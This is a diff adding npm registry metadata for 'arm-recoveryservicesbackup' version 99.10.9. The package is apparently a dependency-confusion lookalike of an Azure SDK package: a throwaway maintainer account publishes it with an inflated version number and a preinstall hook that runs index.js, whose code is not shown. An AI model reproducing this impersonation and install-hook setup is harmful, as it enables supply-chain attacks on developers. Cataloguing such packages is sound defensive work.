@@ -1,0 +1,62 @@
+{
+    "_id": "arm-recoveryservicesbackup",
+    "name": "arm-recoveryservicesbackup",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-recoveryservicesbackup",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-recoveryservicesbackup@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-/tp8/J8No0BuLQcVcW//K/N0OepPozhjBoH/c3vI0dC5xEQoLcJnsn3PlPRrQxIxRlab3dZ9XCkuB4cxQmSakQ==",
+                "shasum": "f5c94ebff701607910af027466f8b020cb65ad15",
+                "tarball": "https://registry.npmjs.org/arm-recoveryservicesbackup/-/arm-recoveryservicesbackup-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5078,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiN1NxACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqWYA/8DHPVVOWS1OWAOv8rB3IbXua88Fx3ewi6fLVIphRiK3rqsGBd\r\nqBjBcTQqEocJVoJu3eZ5SphL3iBaY1EQ4WSazQEDVkSbaX7rdWDiJKKcijYQ\r\nN9ssjTCjyMRnhAt3ospub3vy+aZdj6T1wwBAghcO5gEZpF6qmVY3XL8AC+xd\r\nWyFc7xksaBe/SFRsLV9khJ1C5Fdr8vOmcsNDc8f18qnQyQcfLDDI4q4fRXMS\r\npgboRUeWPiVqMmpNUl3eoJmE7caNulX3VWWMqFSg7il7hxyjaa7wg0cHggI/\r\nOwRcZ9WFG1LQPrtTgxb5wkYyV/HUb3mp3dlrtEJJYYkUxcN8woNOl3qAckxg\r\nolNXdBqkB+6xUtgpakVTrtlHV24CSHQ3zeHmc9zajwwKRcQVXGB/9Dfc8EfM\r\nuZndkMO5iP6OOjV4+Q77nj4jDrsMQdrS/GdWh4IJX7+yxT0nypz/vUqf4kOK\r\nPyxE626NRutWSGTr+GyugTyhRj4+2uPbzCcADjOzKnQPyC4zgbcfF/ZR2fsp\r\nyXjFNt6nKmo2c3WcQLRkLWhbM6YkhQ7kzNDcqQT5SMZqxwSZOWe1qFSxsgdq\r\nH2fzGdneWY5Xux/xjHBC2OGOG11dsXbxFWln9Yct9KD7ojofQMABiOd7xcTt\r\ntVYhAr5LtEfYMHOljKrd1ifju+tDrSUoNp4=\r\n=ONoN\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "z8eolxco",
+                "email": "z8eolxco@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "z8eolxco",
+                    "email": "z8eolxco@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-recoveryservicesbackup_99.10.9_1647793009141_0.9629282224678148"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T16:16:49.141Z",
+        "99.10.9": "2022-03-20T16:16:49.276Z",
+        "modified": "2022-03-20T16:16:49.371Z"
+    },
+    "maintainers": [
+        {
+            "name": "z8eolxco",
+            "email": "z8eolxco@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
